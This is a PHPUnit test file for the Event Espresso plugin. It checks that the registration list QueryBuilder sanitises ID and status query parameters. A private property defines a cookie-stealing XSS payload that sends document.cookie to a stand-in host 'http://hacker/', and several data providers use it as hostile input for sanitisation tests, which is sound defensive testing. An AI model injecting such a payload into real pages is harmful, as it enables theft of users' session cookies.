<?php

namespace EventEspresso\tests\testcases\core\domain\services\admin\registrations\list_table;

use EE_Error;
use EEM_Registration;
use EventEspresso\core\exceptions\InvalidDataTypeException;
use EventEspresso\core\exceptions\InvalidInterfaceException;
use EventEspresso\tests\mocks\core\domain\services\admin\registrations\list_table\QueryBuilderMock;
use EventEspresso\tests\mocks\core\services\request\RequestMock;
use InvalidArgumentException;
use PHPUnit\Framework\Exception;
use PHPUnit\Framework\TestCase;

class QueryBuilderTest extends TestCase
{

    /**
     * @var string $xss
     */
    private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';

    /**
     * @param array $get_params
     * @return QueryBuilderMock
     * @throws EE_Error
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws InvalidArgumentException
     * @since 4.10.2.p
     */
    private function getQueryBuilder(array $get_params)
    {
        return new QueryBuilderMock(
            [],
            new RequestMock($get_params, [], [], [], []),
            EEM_Registration::instance()
        );
    }


    /**
     * @param string $addIdMethod
     * @param string $key
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    private function addIdToWhereConditions($addIdMethod, $key, array $get_params, $exists, $expected)
    {
        $QB = $this->getQueryBuilder($get_params);
        $QB->$addIdMethod();
        $where_params = $QB->getWhereParams();
        if ($exists) {
            $this->assertArrayHasKey($key, $where_params);
            $this->assertEquals($expected, $where_params[ $key ]);
        } else {
            $this->assertArrayNotHasKey($key, $where_params);
        }
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $exists     whether key should exist
     *      $expected   value of $_GET param
     *
     * @return array
     */
    public function attendeeIdProvider()
    {
        return [
            // empty array
            [[], false, null],
            // invalid keys
            [['ATT-ID' => 123], false, null],
            [['attendee-id' => 123], false, null],
            // invalid values
            [['ATT_ID' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['ATT_ID' => $this->xss], true, 0],
            [['attendee_id' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['attendee_id' => $this->xss], true, 0],
            // all good
            [['ATT_ID' => 123], true, 123],
            [['ATT_ID' => '123'], true, 123],
            [['attendee_id' => 123], true, 123],
            [['attendee_id' => '123'], true, 123],
        ];
    }


    /**
     * @dataProvider attendeeIdProvider
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    public function testAddAttendeeIdToWhereConditions(array $get_params, $exists, $expected)
    {
        $this->addIdToWhereConditions(
            'addAttendeeIdToWhereConditions',
            'ATT_ID',
            $get_params,
            $exists,
            $expected
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $exists     whether key should exist
     *      $expected   value of $_GET param
     *
     * @return array
     */
    public function eventIdProvider()
    {
        return [
            // empty array
            [[], false, null],
            // invalid keys
            [['EVT-ID' => 123], false, null],
            [['event-id' => 123], false, null],
            // invalid values
            [['EVT_ID' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['EVT_ID' => $this->xss], true, 0],
            [['event_id' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['event_id' => $this->xss], true, 0],
            // all good
            [['EVT_ID' => 123], true, 123],
            [['EVT_ID' => '123'], true, 123],
            [['event_id' => 123], true, 123],
            [['event_id' => '123'], true, 123],
        ];
    }


    /**
     * @dataProvider eventIdProvider
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    public function testAddEventIdToWhereConditions(array $get_params, $exists, $expected)
    {
        $this->addIdToWhereConditions(
            'addEventIdToWhereConditions',
            'EVT_ID',
            $get_params,
            $exists,
            $expected
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $exists     whether key should exist
     *      $expected   value of $_GET param
     *
     * @return array
     */
    public function categoryIdProvider()
    {
        return [
            // empty array
            [[], false, null],
            // invalid keys
            [['EVT-CAT' => 123], false, null],
            [['term_id' => 123], false, null],
            [['Event.Term_Taxonomy.term_id' => 123], false, null],
            // invalid values >>> PLZ NOTE: event category NOT added if value is not int > 0 !!!
            [['EVT_CAT' => '<h1>big honkin cabbage</h1>'], false, 0],
            [['EVT_CAT' => $this->xss], false, 0],
            // all good
            [['EVT_CAT' => 123], true, 123],
            [['EVT_CAT' => '123'], true, 123],
        ];
    }


    /**
     * @dataProvider categoryIdProvider
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    public function testAddCategoryIdToWhereConditions(array $get_params, $exists, $expected)
    {
        $this->addIdToWhereConditions(
            'addCategoryIdToWhereConditions',
            'Event.Term_Taxonomy.term_id',
            $get_params,
            $exists,
            $expected
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $exists     whether key should exist
     *      $expected   value of $_GET param
     *
     * @return array
     */
    public function datetimeIdProvider()
    {
        return [
            // empty array
            [[], false, null],
            // invalid keys
            [['DTT-ID' => 123], false, null],
            [['datetime-id' => 123], false, null],
            [['Ticket.Datetime.DTT_ID' => 123], false, null],
            // invalid values
            [['DTT_ID' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['DTT_ID' => $this->xss], true, 0],
            [['datetime_id' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['datetime_id' => $this->xss], true, 0],
            // all good
            [['DTT_ID' => 123], true, 123],
            [['DTT_ID' => '123'], true, 123],
            [['datetime_id' => 123], true, 123],
            [['datetime_id' => '123'], true, 123],
        ];
    }


    /**
     * @dataProvider datetimeIdProvider
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    public function testAddDatetimeIdToWhereConditions(array $get_params, $exists, $expected)
    {
        $this->addIdToWhereConditions(
            'addDatetimeIdToWhereConditions',
            'Ticket.Datetime.DTT_ID',
            $get_params,
            $exists,
            $expected
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $exists     whether key should exist
     *      $expected   value of $_GET param
     *
     * @return array
     */
    public function ticketIdProvider()
    {
        return [
            // empty array
            [[], false, null],
            // invalid keys
            [['TKT-ID' => 123], false, null],
            [['ticket-id' => 123], false, null],
            // invalid values
            [['TKT_ID' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['TKT_ID' => $this->xss], true, 0],
            [['ticket_id' => '<h1>big honkin cabbage</h1>'], true, 0],
            [['ticket_id' => $this->xss], true, 0],
            // all good
            [['TKT_ID' => 123], true, 123],
            [['TKT_ID' => '123'], true, 123],
            [['ticket_id' => 123], true, 123],
            [['ticket_id' => '123'], true, 123],
        ];
    }


    /**
     * @dataProvider ticketIdProvider
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    public function testAddTicketIdToWhereConditions(array $get_params, $exists, $expected)
    {
        $this->addIdToWhereConditions(
            'addTicketIdToWhereConditions',
            'TKT_ID',
            $get_params,
            $exists,
            $expected
        );
    }


    /**
     * returns following parameters:
     *      $key        the where parameter that was set
     *      $get_params array of simulated $_GET params
     *      $exists     whether key should exist
     *      $expected   value of $_GET param
     *
     * @return array
     */
    public function registrationStatusProvider()
    {
        $default = ['!=', 'RIC'];
        return [
            // no reg status set, but different views
            ['STS_ID', [], true, $default],
            ['STS_ID', ['status' => 'month'], true, $default],
            ['STS_ID', ['status' => 'today'], true, $default],
            ['STS_ID', ['status' => 'incomplete'], true, 'RIC'],
            ['STS_ID', ['status' => 'trash'], false, $default],
            ['REG_deleted', ['status' => 'trash'], true, true],
            // invalid keys
            ['STS_ID', ['STS_ID' => 'RIC'], true, $default],
            ['STS_ID', ['reg-status' => 'RIC'], true, $default],
            ['STS_ID', ['reg-status' => 'RIC'], true, $default],
            // invalid values
            ['STS_ID', ['_reg_status' => '<h1>big honkin cabbage</h1>'], true, 'big honkin cabbage'],
            ['STS_ID', ['_reg_status' => $this->xss], true, '">'],
            // // all good
            ['STS_ID', ['_reg_status' => 'RIC'], true, 'RIC'],
            ['STS_ID', ['_reg_status' => 'RNA'], true, 'RNA'],
            ['STS_ID', ['_reg_status' => 'RPP'], true, 'RPP'],
            ['STS_ID', ['_reg_status' => 'RWL'], true, 'RWL'],
            ['STS_ID', ['_reg_status' => 'RAP'], true, 'RAP'],
            ['STS_ID', ['_reg_status' => 'RCN'], true, 'RCN'],
            ['STS_ID', ['_reg_status' => 'RDC'], true, 'RDC'],
        ];
    }


    /**
     * @dataProvider registrationStatusProvider
     * @param string $key
     * @param array  $get_params
     * @param bool   $exists
     * @param int    $expected
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     */
    public function testAddRegistrationStatusToWhereConditions($key, array $get_params, $exists, $expected)
    {
        $this->addIdToWhereConditions(
            'addRegistrationStatusToWhereConditions',
            $key,
            $get_params,
            $exists,
            $expected
        );
    }
}
